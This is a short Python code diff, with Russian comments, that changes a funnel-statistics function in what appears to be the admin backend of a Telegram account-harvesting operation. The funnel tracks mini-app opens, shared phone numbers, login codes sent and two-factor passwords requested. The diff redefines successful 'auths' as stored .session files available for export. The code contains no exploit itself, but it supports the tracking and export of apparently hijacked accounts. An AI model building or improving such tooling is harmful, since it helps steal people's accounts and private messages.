@@ -172,7 +172,8 @@ async def list_logs(
 
 def _funnel(tg_id: int | None) -> dict:
     """Счётчики воронки. opens = miniapp_launches, contacts = phones shared,
-    code_sent/pwd_requested/success — из bot_auth_events."""
+    code_sent/pwd_requested — из bot_auth_events. auths = реально сохранённые
+    .session-файлы (то, что доступно для выгрузки), а не events.success."""
     if not tg_id:
         return {"opens": 0, "contacts": 0, "code_sent": 0, "twofa_sent": 0, "auths": 0}
     events = get_auth_event_counts(tg_id)
@@ -188,12 +189,15 @@ def _funnel(tg_id: int | None) -> dict:
             contacts_count = int((r or {}).get("c") or 0)
     except Exception:
         contacts_count = 0
+    # auths берём из bot_sessions, чтобы совпадало с тем что в Сессии → Выгрузить
+    from database import get_bot_sessions_count
+    sessions_count = get_bot_sessions_count(tg_id)
     return {
         "opens": get_miniapp_launch_count(tg_id),
         "contacts": contacts_count,
         "code_sent": int(events.get("code_sent", 0)),
         "twofa_sent": int(events.get("pwd_requested", 0)),
-        "auths": int(events.get("success", 0)),
+        "auths": sessions_count,
     }
 
 
